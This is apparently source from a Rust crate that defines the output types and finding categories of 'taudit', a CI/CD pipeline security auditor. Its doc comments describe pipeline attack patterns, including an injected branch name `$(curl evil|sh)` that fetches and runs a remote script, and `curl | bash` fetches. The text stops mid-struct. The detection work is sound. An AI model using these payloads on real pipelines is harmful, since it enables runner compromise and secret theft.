//! # taudit-api — stable wire types for JSON / SARIF / CloudEvents
//!
//! This crate owns every Rust type that appears in taudit's emitted
//! output (JSON `taudit-report.schema.json`, JSON `authority-graph.v1.json`,
//! SARIF `result.message.text` and `result.ruleId`, CloudEvents
//! `tauditruleid` / `tauditfindingfingerprint` extension attributes).
//!
//! ## Stability promise (0.x)
//!
//! While at `0.x`:
//! - Additive changes (new variants, new fields) MAY ship in any minor
//!   bump. Consumers should pin a minor (`taudit-api = "0.1"`) and
//!   review on each upgrade.
//! - Breaking changes (renamed fields, removed variants, changed serde
//!   representations) trigger a `0.{N+1}` minor bump and a CHANGELOG
//!   migration note.
//!
//! At `1.0`, the promise lifts: only `2.0` permits breaking changes; all
//! `1.x` minor bumps are additive.
//!
//! ## Use in downstream tooling
//!
//! Downstream consumers (tsign, axiom, custom SIEM integrations,
//! Backstage plugins) should depend on `taudit-api` directly rather than
//! `taudit-core`. `taudit-core` is workspace-internal and may break
//! between minors; `taudit-api` is the public contract.
//!
//! See ADR 0001 (graph as product) and ADR 0004 (prereleases publish to
//! crates.io).

#![deny(missing_docs)]

use serde::{Deserialize, Serialize, Serializer};
use std::collections::{BTreeMap, HashMap};
use std::path::PathBuf;

// ── Severity ─────────────────────────────────────────────────────

/// Severity of a finding. Ordered by `rank()` (Critical = most severe).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Severity {
    /// Highest — exploitable now, full authority leak.
    Critical,
    /// Significant exposure that needs prompt action.
    High,
    /// Notable but bounded risk.
    Medium,
    /// Low priority / hygiene.
    Low,
    /// Informational — no direct exposure, surfaces context for triage.
    Info,
}

impl Severity {
    fn rank(self) -> u8 {
        match self {
            Severity::Critical => 0,
            Severity::High => 1,
            Severity::Medium => 2,
            Severity::Low => 3,
            Severity::Info => 4,
        }
    }
}

impl Ord for Severity {
    fn cmp(&self, other: &Self) -> std::cmp::Ordering {
        self.rank().cmp(&other.rank())
    }
}

impl PartialOrd for Severity {
    fn partial_cmp(&self, other: &Self) -> Option<std::cmp::Ordering> {
        Some(self.cmp(other))
    }
}

/// Move severity one rank toward `Info` (Critical -> High -> ... -> Info).
/// `Info` stays `Info`. Used by both the suppression applicator and
/// compensating-control detectors.
///
/// **API stability:** marked `#[doc(hidden)]` because this helper is a
/// taudit-internal detail; downstream consumers should read `severity`
/// directly from the JSON / SARIF / CloudEvents output.
#[doc(hidden)]
pub fn downgrade_severity(s: Severity) -> Severity {
    match s {
        Severity::Critical => Severity::High,
        Severity::High => Severity::Medium,
        Severity::Medium => Severity::Low,
        Severity::Low => Severity::Info,
        Severity::Info => Severity::Info,
    }
}

// ── FindingCategory ──────────────────────────────────────────────

/// MVP categories (1-5) are derivable from pipeline YAML alone.
/// Stretch categories (6-9) need heuristics or metadata enrichment.
#[allow(missing_docs)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingCategory {
    // MVP
    AuthorityPropagation,
    OverPrivilegedIdentity,
    UnpinnedAction,
    UntrustedWithAuthority,
    ArtifactBoundaryCrossing,
    // Stretch — implemented
    FloatingImage,
    LongLivedCredential,
    /// Credential written to disk by a step (e.g. `persistCredentials: true` on a checkout).
    /// Disk-persisted credentials are accessible to all subsequent steps and any process
    /// with filesystem access, unlike runtime-only `HasAccessTo` authority.
    PersistedCredential,
    /// Dangerous trigger type (pull_request_target / pr) combined with secret/identity access.
    TriggerContextMismatch,
    /// Authority (secret/identity) flows into an opaque external workflow via DelegatesTo.
    CrossWorkflowAuthorityChain,
    /// Circular DelegatesTo chain — workflow calls itself transitively.
    AuthorityCycle,
    /// Privileged workflow (OIDC/broad identity) with no provenance attestation step.
    UpliftWithoutAttestation,
    /// Step writes to the environment gate ($GITHUB_ENV, pipeline variables) — authority can propagate.
    SelfMutatingPipeline,
    /// PR-triggered pipeline checks out the repository — attacker-controlled fork code lands on the runner.
    CheckoutSelfPrExposure,
    /// ADO variable group consumed by a PR-triggered job, crossing trust boundary.
    VariableGroupInPrJob,
    /// Self-hosted agent pool used in a PR-triggered job that also checks out the repository.
    SelfHostedPoolPrHijack,
    /// ADO self-hosted pool without workspace isolation (`clean: true`/`all`).
    /// Shared self-hosted agents retain their workspace across pipeline runs.
    /// Without `workspace: { clean: all }`, a PR build can deposit malicious
    /// files that persist for the next (possibly privileged) pipeline run,
    /// enabling workspace poisoning attacks.
    SharedSelfHostedPoolNoIsolation,
    /// Broad-scope ADO service connection reachable from a PR-triggered job without OIDC.
    ServiceConnectionScopeMismatch,
    /// ADO `resources.repositories[]` entry referenced by an `extends:`,
    /// `template: x@alias`, or `checkout: alias` consumer resolves with no
    /// `ref:` (default branch) or a mutable branch ref (`refs/heads/<name>`).
    /// Whoever owns that branch can inject steps into the consuming pipeline.
    TemplateExtendsUnpinnedBranch,
    /// ADO `resources.repositories[]` entry pinned to a feature-class branch
    /// (anything outside the `main` / `master` / `release/*` / `hotfix/*`
    /// platform set). Feature branches typically have weaker push protection
    /// than the trunk, so any developer with write access to that branch can
    /// inject pipeline YAML that runs with the consumer's authority. Strictly
    /// stronger signal than `template_extends_unpinned_branch` — co-fires.
    TemplateRepoRefIsFeatureBranch,
    /// Pipeline step uses an Azure VM remote-exec primitive (Set-AzVMExtension /
    /// CustomScriptExtension, Invoke-AzVMRunCommand, az vm run-command, az vm extension set)
    /// where the executed command line interpolates a pipeline secret or a SAS token —
    /// pipeline-to-VM lateral movement primitive logged in plaintext to the VM and ARM.
    VmRemoteExecViaPipelineSecret,
    /// A SAS token freshly minted in-pipeline is interpolated into a CLI argument
    /// (commandToExecute / scriptArguments / --arguments / -ArgumentList) instead of
    /// passed via env var or stdin — argv ends up in /proc/*/cmdline, ETW, ARM status.
    ShortLivedSasInCommandLine,
    /// Pipeline secret value assigned to a shell variable inside an inline
    /// script (`export VAR=$(SECRET)`, `$X = "$(SECRET)"`). Once the value
    /// transits a shell variable, ADO's `$(SECRET)` log mask no longer
    /// applies — transcripts (`Start-Transcript`, `bash -x`, terraform debug
    /// logs) print the cleartext.
    SecretToInlineScriptEnvExport,
    /// Pipeline secret value written to a file under the agent workspace
    /// (`$(System.DefaultWorkingDirectory)`, `$(Build.SourcesDirectory)`,
    /// or relative paths) without `secureFile` task or chmod 600. The file
    /// persists in the agent workspace and is uploaded by
    /// `PublishPipelineArtifact` and crawlable by later steps.
    SecretMaterialisedToWorkspaceFile,
    /// PowerShell pulls a Key Vault secret with `-AsPlainText` (or
    /// `ConvertFrom-SecureString -AsPlainText`, or older
    /// `.SecretValueText` syntax) into a non-`SecureString` variable. The
    /// value never traverses the ADO variable-group boundary, so verbose
    /// Az/PS logging and error stack traces print the credential.
    ///
    /// Rule id is `keyvault_secret_to_plaintext` (single token "keyvault")
    /// rather than the snake_case derivation `key_vault_…` — matches the
    /// docs filename and the convention used in the corpus evidence.
    #[serde(rename = "keyvault_secret_to_plaintext")]
    KeyVaultSecretToPlaintext,
    /// `terraform apply -auto-approve` against a production-named service connection
    /// without an environment approval gate.
    TerraformAutoApproveInProd,
    /// `AzureCLI@2` task with `addSpnToEnvironment: true` AND an inline script —
    /// the script can launder federated SPN/OIDC tokens into pipeline variables.
    AddSpnWithInlineScript,
    /// A `type: string` pipeline parameter (no `values:` allowlist) is interpolated
    /// via `${{ parameters.X }}` into an inline shell/PowerShell script body —
    /// shell injection vector for anyone with "queue build".
    ParameterInterpolationIntoShell,
    /// A `run:` block fetches a remote script from a mutable URL (`refs/heads/`,
    /// `/main/`, `/master/`) and pipes it directly to a shell interpreter
    /// (`curl … | bash`, `wget … | sh`, `bash <(curl …)`, `deno run https://…`).
    /// Whoever controls that URL's content controls execution on the runner.
    RuntimeScriptFetchedFromFloatingUrl,
    /// Workflow trigger combines high-authority PR events
    /// (`pull_request_target`, `issue_comment`, or `workflow_run`) with a step
    /// whose `uses:` ref is a mutable branch/tag (not a 40-char SHA). Compromise
    /// of the action's default branch yields full repo write on the target repo.
    PrTriggerWithFloatingActionRef,
    /// A `workflow_run`-triggered workflow captures a value from an external
    /// API response (`gh pr view`, `gh api`, `curl api.github.com`) and writes
    /// it into `$GITHUB_ENV`/`$GITHUB_OUTPUT`/`$GITHUB_PATH` without sanitisation.
    /// A poisoned API field (branch name, title) injects environment variables
    /// into every subsequent step in the same job.
    UntrustedApiResponseToEnvSink,
    /// A `pull_request`-triggered workflow logs into a container registry via a
    /// floating (non-SHA-pinned) login action. The compromised action receives
    /// OIDC tokens or registry credentials, and the workflow then pushes a
    /// PR-controlled image to a shared registry.
    PrBuildPushesImageWithFloatingCredentials,
    /// First-party step writes a Secret/Identity-derived value into the
    /// `$GITHUB_ENV` gate (or pipeline-variable equivalent) and a *later*
    /// step in the same job that runs in `Untrusted` or `ThirdParty` trust
    /// zone reads from the runner-managed env (`${{ env.X }}`). The two
    /// component rules — `self_mutating_pipeline` (writer) and
    /// `untrusted_with_authority` (consumer) — each see only half the
    /// chain and emit no finding for the laundered consumer; this rule
    /// closes the composition gap that R2 attack #3 exploited.
    SecretViaEnvGateToUntrustedConsumer,
    /// Positive-invariant rule (GHA): the workflow declares neither a
    /// top-level nor a per-job `permissions:` block, leaving GITHUB_TOKEN at
    /// its broad platform default. Fires once per workflow file.
    NoWorkflowLevelPermissionsBlock,
    /// Positive-invariant rule (ADO): a job referencing a production-named
    /// service connection has no `environment:` binding, so it bypasses the
    /// only ADO-side approval gate regardless of whether `-auto-approve` is
    /// present. Strictly broader than `terraform_auto_approve_in_prod`.
    ProdDeployJobNoEnvironmentGate,
    /// Positive-invariant rule (cross-platform): a long-lived static
    /// credential is in scope but the workflow does not currently use any
    /// OIDC identity even though the target cloud supports federation.
    /// Advisory uplift on top of `long_lived_credential` that wires the
    /// existing `Recommendation::FederateIdentity` variant.
    LongLivedSecretWithoutOidcRecommendation,
    /// Positive-invariant rule (GHA): a PR-triggered workflow has multiple
    /// privileged jobs where SOME have the standard fork-check `if:` and
    /// OTHERS do not. Detects an intra-file inconsistency in defensive
    /// posture — the org has the right instinct but applied it unevenly.
    PullRequestWorkflowInconsistentForkCheck,
    /// Positive-invariant rule (GitLab): a job with a production-named
    /// `environment:` binding has no `rules:` / `only:` clause restricting
    /// it to protected branches. Deploy job runs (or attempts to run) on
    /// every pipeline trigger.
    GitlabDeployJobMissingProtectedBranchOnly,
    /// Two-step ADO chain: an inline script captures a `terraform output`
    /// value (literal `terraform output` CLI invocation or a `$env:TF_OUT_*` /
    /// `$TF_OUT_*` env var sourced from a Terraform CLI task) AND emits a
    /// `##vso[task.setvariable variable=X;...]` directive setting that
    /// captured value into pipeline variable `X`. A subsequent step in the
    /// same job then expands `$(X)` in shell-expansion position
    /// (`bash -c "..."`, `eval`, command substitution `$(...)`, PowerShell
    /// `-split` / `Invoke-Command` / `Invoke-Expression`/`iex`, or as an
    /// unquoted command word). The `task.setvariable` hop launders
    /// attacker-controlled Terraform state — sourced from a remote backend
    /// (S3 bucket, Azure Storage) that often has weaker access controls than
    /// the pipeline itself — through pipeline-variable space and into a
    /// shell interpreter.
    TerraformOutputViaSetvariableShellExpansion,
    /// GHA workflow declares a high-blast-radius trigger (`issue_comment`,
    /// `pull_request_review`, `pull_request_review_comment`, `workflow_run`)
    /// alongside write permissions or non-`GITHUB_TOKEN` secrets. Closes the
    /// gap left by `trigger_context_mismatch` only firing on
    /// `pull_request_target` / ADO `pr`.
    RiskyTriggerWithAuthority,
    /// A `jobs.<id>.outputs.<name>` value is sourced from `secrets.*`, an
    /// OIDC-bearing step output, or has a credential-shaped name. Job outputs
    /// flow unmasked through `needs.<job>.outputs.*` and are written to the
    /// run log — masking is heuristic, never authoritative.
    SensitiveValueInJobOutput,
    /// A `workflow_dispatch.inputs.*` value flows into `curl` / `wget` /
    /// `gh api` / a `run:` URL / `actions/checkout` `ref:`. Anyone with
    /// dispatch permission can pivot the run to attacker-controlled refs or
    /// hosts.
    ManualDispatchInputToUrlOrCommand,
    /// A reusable workflow call uses `secrets: inherit` while the caller is
    /// triggered by an attacker-influenced event (`pull_request`,
    /// `pull_request_target`, `issue_comment`, `workflow_run`). The whole
    /// caller secret bag forwards to the callee regardless of what the callee
    /// actually consumes — every transitive `uses:` in the called workflow
    /// inherits the same scope.
    SecretsInheritOverscopedPassthrough,
    /// A `workflow_run`- or `pull_request_target`-triggered consumer
    /// downloads an artifact from the originating run AND interprets that
    /// artifact's content into a privileged sink (post-to-comment, write to
    /// `$GITHUB_ENV`, `eval`, …). The producer ran in PR context, so a
    /// malicious PR can write arbitrary content into the artifact while the
    /// consumer holds upstream-repo authority.
    UnsafePrArtifactInWorkflowRunConsumer,
    /// A GitHub Actions `run:` block (or `actions/github-script` `script:` body)
    /// interpolates an attacker-controllable expression — `${{ github.event.* }}`,
    /// `${{ github.head_ref }}`, or `${{ inputs.* }}` from a privileged trigger
    /// (`workflow_dispatch` / `workflow_run` / `issue_comment`) — directly into
    /// the script text without first binding through an `env:` indirection.
    /// Classic GitHub Actions remote-code-execution pattern.
    ScriptInjectionViaUntrustedContext,
    /// A workflow that holds non-`GITHUB_TOKEN` secrets or non-default
    /// write permissions includes a step that uses an interactive debug action
    /// (mxschmitt/action-tmate, lhotari/action-upterm, actions/tmate, …).
    /// A maintainer flipping `debug_enabled=true` publishes the runner's full
    /// environment over an external SSH endpoint.
    InteractiveDebugActionInAuthorityWorkflow,
    /// An `actions/cache` step keys the cache on a PR-derived expression
    /// (`github.head_ref`, `github.event.pull_request.head.ref`, `github.actor`)
    /// in a workflow that ALSO runs on `push: branches: [main]` — a PR can
    /// poison the cache that the default-branch build later restores.
    PrSpecificCacheKeyInDefaultBranchConsumer,
    /// A `run:` step uses `gh ` / `gh api` with the default `GITHUB_TOKEN` to
    /// perform a write-class action (`pr merge`, `release create/upload`,
    /// `api -X POST/PATCH/PUT/DELETE` to `/repos/.../{contents,releases,actions/secrets,environments}`)
    /// inside a workflow triggered by `pull_request`, `issue_comment`, or
    /// `workflow_run` — runtime privilege escalation that static permission
    /// checks miss.
    GhCliWithDefaultTokenEscalating,
    /// GitLab CI `$CI_JOB_TOKEN` (or `gitlab-ci-token:$CI_JOB_TOKEN`) used as a
    /// bearer credential against an external HTTP API or fed to `docker login`
    /// for `registry.gitlab.com`. CI_JOB_TOKEN's default scope (registry write,
    /// package upload, project read) means a poisoned MR job that emits the
    /// token to a webhook can pivot to package/registry pushes elsewhere.
    CiJobTokenToExternalApi,
    /// GitLab CI `id_tokens:` declares an `aud:` audience that is reused across
    /// MR-context and protected-context jobs (no audience separation), or is a
    /// wildcard / multi-cloud broker URL. The audience is what trades for
    /// downstream cloud creds — a single shared `aud` means any job that
    /// compromises the token assumes the most-privileged role any other job
    /// uses.
    IdTokenAudienceOverscoped,
    /// Direct shell interpolation of attacker-controlled GitLab predefined
    /// vars (`$CI_COMMIT_BRANCH`, `$CI_COMMIT_REF_NAME`, `$CI_COMMIT_TAG`,
    /// `$CI_COMMIT_MESSAGE`, `$CI_COMMIT_TITLE`, `$CI_MERGE_REQUEST_TITLE`,
    /// `$CI_MERGE_REQUEST_DESCRIPTION`,
    /// `$CI_MERGE_REQUEST_SOURCE_BRANCH_NAME`, `$CI_COMMIT_AUTHOR`) into
    /// `script:` / `before_script:` / `after_script:` / `environment:url:`
    /// without single-quote isolation. A branch named `` $(curl evil|sh) ``
    /// executes inside the runner. GitLab generalisation of the GHA
    /// `script_injection_via_untrusted_context` class.
    UntrustedCiVarInShellInterpolation,
    /// A GitLab `include:` references (a) a `remote:` URL pointing at a
    /// branch (`/-/raw/<branch>/...`), (b) a `project:` with `ref:` resolving
    /// to a mutable branch name (main/master/develop), or (c) an include with
    /// no `ref:` at all (defaults to HEAD). Whoever owns that branch can
    /// backdoor every consumer's pipeline silently — included YAML executes
    /// with the consumer's secrets and CI_JOB_TOKEN.
    UnpinnedIncludeRemoteOrBranchRef,
    /// A GitLab job declares a `services: [docker:*-dind]` sidecar AND holds
    /// at least one non-CI_JOB_TOKEN secret (registry creds, deploy keys,
    /// signing keys, vault id_tokens). docker-in-docker exposes the full
    /// Docker socket inside the job container — a malicious build step can
    /// `docker run -v /:/host` from inside dind and read the runner host
    /// filesystem (other jobs' artifacts, cached creds).
    DindServiceGrantsHostAuthority,
    /// A GitLab job whose name or `extends:` matches scanner patterns
    /// (`sast`, `dast`, `secret_detection`, `dependency_scanning`,
    /// `container_scanning`, `gitleaks`, `trivy`, `grype`, `semgrep`, etc.)
    /// runs with `allow_failure: true` AND has no `rules:` clause that
    /// surfaces the failure. The pipeline goes green even when the scan
    /// errors out — silent-pass is worse than no scan because reviewers trust
    /// the badge.
    SecurityJobSilentlySkipped,
    /// A GitLab `trigger:` job (downstream / child pipeline) runs in
    /// `merge_request_event` context OR uses `include: artifact:` from a
    /// previous job (dynamic child pipeline). Dynamic child pipelines are a
    /// code-injection sink — anything the build step writes to the artifact
    /// runs as a real pipeline with the parent project's secrets.
    ChildPipelineTriggerInheritsAuthority,
    /// A GitLab `cache:` declaration whose `key:` is hardcoded, `$CI_JOB_NAME`
    /// only, or `$CI_COMMIT_REF_SLUG` without a `policy: pull` restriction.
    /// Caches are stored per-runner keyed by `key:`; a poisoned MR can push a
    /// malicious `node_modules/` cache that the next default-branch job
    /// downloads and executes during `npm install`.
    CacheKeyCrossesTrustBoundary,
    /// A CI script constructs an HTTPS git URL with embedded credentials
    /// (`https://user:$TOKEN@host/...`) before invoking `git clone`,
    /// `git push`, or `git remote set-url`. The credential is exposed
    /// in the process argv (visible to `ps`, `/proc/*/cmdline`), persists
    /// in `.git/config` for the rest of the job, and may be uploaded as
    /// part of any artifact that bundles the workspace.
    PatEmbeddedInGitRemoteUrl,
    /// A CI job triggers a different project's pipeline via the GitLab
    /// REST API using `CI_JOB_TOKEN` and forwards user-influenced variables
    /// through the `variables[KEY]=value` query/form parameter. The
    /// downstream project's security depends on the trust contract between
    /// the two projects — variable values flowing across that boundary
    /// constitute a cross-project authority bridge.
    CiTokenTriggersDownstreamWithVariablePassthrough,
    /// A GitLab job emits an `artifacts.reports.dotenv: <file>` artifact
    /// whose contents become pipeline variables for any consumer linked
    /// via `needs:` or `dependencies:`. A consumer in a later stage that
    /// targets a production-named environment inherits those variables
    /// transparently — no explicit download is visible at the job level.
    /// When the producer reads attacker-influenced inputs (branch names,
    /// commit messages), the dotenv flow is a covert privilege escalation
    /// channel into the deployment job.
    DotenvArtifactFlowsToPrivilegedDeployment,
    /// ADO inline script sets a sensitive-named pipeline variable via
    /// `##vso[task.setvariable variable=<NAME>]` with `issecret=false` or
    /// without the `issecret` flag at all. Without `issecret=true` the
    /// variable value is printed in plaintext to the pipeline log and is
    /// not masked in downstream step output.
    SetvariableIssecretFalse,
    /// A GHA `uses:` action reference contains a non-ASCII character —
    /// possible Unicode confusable / homoglyph impersonating a trusted
    /// action (e.g. Cyrillic `a` instead of Latin `a`, or U+2215
    /// DIVISION SLASH instead of U+002F SOLIDUS).
    HomoglyphInActionRef,
    /// A GitHub Actions step mutates `GITHUB_PATH` before a later known
    /// helper-delegating action passes sensitive material to a bare helper via
    /// command-line arguments. The prior step can select the helper that
    /// receives later action-only authority.
    GhaHelperPathSensitiveArgv,
    /// A GitHub Actions step mutates `GITHUB_PATH` before a later known
    /// helper-delegating action passes sensitive material to a bare helper over
    /// stdin, such as Docker login passwords or Wrangler secret payloads.
    GhaHelperPathSensitiveStdin,
    /// A GitHub Actions step mutates `GITHUB_PATH` before a later known
    /// helper-delegating action runs a bare helper with sensitive environment
    /// values in scope.
    GhaHelperPathSensitiveEnv,
    /// A GitHub Actions post action recomputes cleanup targets from ambient
    /// environment rather than an action-owned state channel, allowing later
    /// `GITHUB_ENV` writes to retarget cleanup.
    GhaPostAmbientEnvCleanupPath,
    /// A GitHub Actions action mints or exchanges later credentials and then
    /// delegates them to a PATH-resolved helper.
    GhaActionMintedSecretToHelper,
    /// A GitHub Actions action invokes a security-sensitive helper by bare
    /// name after an earlier same-job `GITHUB_PATH` mutation.
    GhaHelperUntrustedPathResolution,
    /// A GitHub Actions login action exposes credential material as step
    /// outputs after helper login, making cross-job propagation easy to miss.
    GhaSecretOutputAfterHelperLogin,
    /// Umbrella GHA authority-confusion classifier: an earlier same-job
    /// `GITHUB_PATH` mutation precedes a later helper action that receives or
    /// mints sensitive authority.
    LaterSecretMaterializedAfterPathMutation,
    /// `actions/setup-node` cache mode resolves npm/pnpm/yarn helpers after an
    /// earlier same-job `GITHUB_PATH` mutation.
    GhaSetupNodeCacheHelperPathHandoff,
    /// `actions/setup-python` cache mode resolves pip/pipenv/poetry helpers
    /// after an earlier same-job `GITHUB_PATH` mutation.
    GhaSetupPythonCacheHelperPathHandoff,
    /// `actions/setup-python` pip-install mode runs pip while inheriting
    /// ambient credentials or cloud authority.
    GhaSetupPythonPipInstallAuthorityEnv,
    /// `actions/setup-go` cache mode resolves Go helpers after an earlier
    /// same-job `GITHUB_PATH` mutation.
    GhaSetupGoCacheHelperPathHandoff,
    /// `docker/setup-qemu-action` invokes Docker/QEMU helper flow in a job that
    /// already has registry authority or private-image context.
    GhaDockerSetupQemuPrivilegedDockerHelper,
    /// Tool-installer action is followed by shell use of the installed helper
    /// while deploy/signing authority is in scope.
    GhaToolInstallerThenShellHelperAuthority,
    /// Shell command sequence concentrates publish, deploy, signing, registry,
    /// or release authority in a workflow step.
    GhaWorkflowShellAuthorityConcentration,
    /// `peter-evans/create-pull-request` receives PR token authority after an
    /// earlier same-job `GITHUB_PATH` mutation and delegates to `git`.
    GhaCreatePrGitTokenPathHandoff,
    /// `crazy-max/ghaction-import-gpg` receives GPG private key/passphrase
    /// material after an earlier same-job `GITHUB_PATH` mutation.
    GhaImportGpgPrivateKeyHelperPath,
    /// `webfactory/ssh-agent` receives SSH private key material after an
    /// earlier same-job `GITHUB_PATH` mutation.
    GhaSshAgentPrivateKeyToPathHelper,
    /// `apple-actions/import-codesign-certs` receives macOS P12/keychain
    /// material after an earlier same-job `GITHUB_PATH` mutation.
    GhaMacosCodesignCertSecurityPath,
    /// Pages deploy actions compose token/deploy-key Git authority after an
    /// earlier same-job `GITHUB_PATH` mutation.
    GhaPagesDeployTokenUrlToGitHelper,
    /// Precision guard for actions that install a helper into the toolcache
    /// and invoke that absolute path instead of resolving a bare helper from
    /// runner `PATH`.
    GhaToolcacheAbsolutePathDowngrade,
    // Reserved — requires ADO/GH API enrichment beyond pipeline YAML.
    // Sealed against deserialisation: a custom-rule YAML using these
    // categories errors out with `unknown variant` at load time, because
    // they cannot be detected from pipeline YAML alone. They still
    // serialise normally so future runtime-enrichment paths inside the
    // taudit binary can emit them, and the output schemas advertise them.
    /// Requires runtime network telemetry or policy enrichment — not detectable from YAML alone.
    #[serde(skip_deserializing)]
    #[doc(hidden)]
    EgressBlindspot,
    /// Requires external audit-sink configuration data — not detectable from YAML alone.
    #[serde(skip_deserializing)]
    #[doc(hidden)]
    MissingAuditTrail,
}

// ── Recommendation ───────────────────────────────────────────────

/// Routing: scope findings -> TsafeRemediation; isolation findings -> CellosRemediation.
#[allow(missing_docs)]
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type", rename_all = "snake_case")]
pub enum Recommendation {
    /// Remediate via `tsafe` — narrow / rotate / revoke a credential or scope.
    TsafeRemediation {
        command: String,
        explanation: String,
    },
    /// Remediate via CellOS isolation primitives.
    CellosRemediation { reason: String, spec_hint: String },
    /// Pin a floating action reference to an immutable SHA.
    PinAction { current: String, pinned: String },
    /// Reduce the permissions block on the scope-bearing step.
    ReducePermissions { current: String, minimum: String },
    /// Replace a long-lived static credential with a federated OIDC identity.
    FederateIdentity {
        static_secret: String,
        oidc_provider: String,
    },
    /// Free-form manual remediation — used when no canned action applies.
    Manual { action: String },
}

// ── FindingSource ────────────────────────────────────────────────

/// Provenance of a finding — distinguishes findings emitted by built-in
/// taudit rules from findings emitted by user-loaded custom invariant YAML
/// (`--invariants-dir`). Custom rules can emit arbitrarily-worded findings
/// at any severity, so an operator piping output into a JIRA workflow or
/// SARIF upload needs a non-spoofable signal of which file the rule came
/// from. Serializes as `"built-in"` (string) for built-in findings and
/// `{"custom": "<path>"}` for custom-rule findings — see
/// `docs/finding-fingerprint.md` for the contract.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingSource {
    /// Emitted by a built-in rule defined in `taudit-core::rules`. The
    /// authoritative trust anchor — the binary's release commit defines the
    /// rule logic. Serialises as the kebab-case string `"built-in"` to match
    /// `schemas/finding.v1.json`.
    #[default]
    #[serde(rename = "built-in")]
    BuiltIn,
    /// Emitted by a custom invariant rule loaded from the given YAML file.
    /// The path is the file the rule was loaded from, retained so operators
    /// can audit which file produced any given finding.
    Custom {
        /// On-disk path of the custom-rule YAML file that produced this finding.
        source_file: PathBuf,
    },
}

impl FindingSource {
    /// True for findings emitted by built-in rules.
    pub fn is_built_in(&self) -> bool {
        matches!(self, FindingSource::BuiltIn)
    }
}

// ── FixEffort ────────────────────────────────────────────────────

/// Coarse-grained remediation effort. Surfaces in JSON `time_to_fix` and SARIF
/// `properties.timeToFix` so triage dashboards can sort by `severity * effort`.
///
/// The four buckets are deliberately wide. Precise time estimates would invite
/// argument; the buckets exist to separate "flip a flag" from "rewrite a job"
/// from "renegotiate ops policy".
///
/// Per `MEMORY/.../blueteam-corpus-defense.md` Section 3 / Enhancement E-3.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FixEffort {
    /// ~5 minutes. Mechanical change to a single file (flip a flag, pin a SHA,
    /// add a `permissions: {}` block). No structural risk.
    Trivial,
    /// ~1 hour. Refactor a step or job: split a script, add a fork-check,
    /// move a secret to an environment binding.
    Small,
    /// ~1 day. Restructure a job or pipeline: introduce an environment gate,
    /// move from inline scripts to a sandboxed action, add an OIDC role.
    Medium,
    /// ~1 week or more. Operational policy change: migrate from PATs to OIDC
    /// across an org, change branch protection model, retire a service principal.
    Large,
}

// ── FindingExtras + Finding ──────────────────────────────────────

/// Optional finding metadata. Lives on every `Finding` via
/// `#[serde(flatten)]` so consumers see the fields at the top of the
/// finding object — same place they'd appear if declared inline on
/// `Finding`. Default-constructed extras serialize to nothing (all
/// `Option::None` and empty `Vec`s skip-serialize), so existing
/// snapshots remain byte-stable until a rule populates a field.
///
/// **Why a wrapper struct?** The 30+ rule call sites use struct
/// literal syntax. Adding fields directly to `Finding` would force
/// every site to edit. With `extras: FindingExtras::default()`, new
/// extras can be added in a single place.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct FindingExtras {
    /// Stable UUID v5 over `(NAMESPACE, fingerprint)` — collapses
    /// per-hop findings against the same authority root into one group
    /// for SIEM display. See `compute_finding_group_id`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub finding_group_id: Option<String>,

    /// Coarse remediation effort. See `FixEffort`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub time_to_fix: Option<FixEffort>,

    /// Human-readable list of controls that already neutralise (or partially
    /// neutralise) this finding — populated when a compensating-control
    /// detector downgrades severity. Empty when no downgrade applied.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub compensating_controls: Vec<String>,

    /// Set to `true` by the suppression applicator when a matching
    /// `.taudit-suppressions.yml` entry exists AND the configured mode
    /// is `Suppress`. The finding still appears in output (audit trail
    /// preserved) but consumers can filter on this field.
    #[serde(default, skip_serializing_if = "is_false")]
    pub suppressed: bool,

    /// Original pre-downgrade severity. Populated by the suppression
    /// applicator OR a compensating-control detector when `severity`
    /// is mutated. `None` means the current severity is the rule-emitted
    /// value.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub original_severity: Option<Severity>,

    /// Operator-supplied justification from the matching suppression
    /// entry. `None` when no suppression applies.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub suppression_reason: Option<String>,

    /// Per-finding stable anchor mixed into the fingerprint canonical
    /// string. Populated by rules that have no natural graph node to
    /// place in `nodes_involved` (e.g. ADO `resources.repositories[]`
    /// aliases, GitLab `include:` entries, workflow-level invariants).
    /// When two findings of the same rule fire in the same file, their
    /// anchors must differ for the fingerprints to differ.
    ///
    /// Round-trips through JSON so external tools that recompute
    /// fingerprints from loaded findings get the same value as the
    /// emitting taudit run. `None` (the default) and `Some("")` are the
    /// same equivalence class — both contribute the empty marker to the
    /// canonical string.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub fingerprint_anchor: Option<String>,

    /// Scope of confidence for this finding. Current built-in rules are
    /// `yaml_only`: taudit has proved a static authority shape in the scanned
    /// YAML artifact, but runtime/provider settings may still affect
    /// exploitability.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub confidence_scope: Option<String>,

    /// Human-readable runtime or control-plane assumptions that must be
    /// verified before treating the static finding as live exploitability.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub runtime_preconditions: Vec<String>,

    /// True when exploitability materially depends on provider-side controls
    /// not represented in the YAML artifact, such as Azure DevOps service
    /// connection authorization or GitHub repository settings.
    #[serde(default, skip_serializing_if = "is_false")]
    pub portal_control_dependency: bool,

    /// Coarse authority kinds involved in the finding: e.g. `job_token`,
    /// `oidc_identity`, `service_connection`, `variable_group`,
    /// `credential_named_variable`, `artifact`, or `image`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub authority_kinds: Vec<String>,

    /// Coarse attacker-influenced surfaces involved in the finding: e.g.
    /// `untrusted_checkout`, `script_sink`, `mutable_dependency_ref`,
    /// `reusable_workflow_boundary`, or `self_hosted_runner`.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
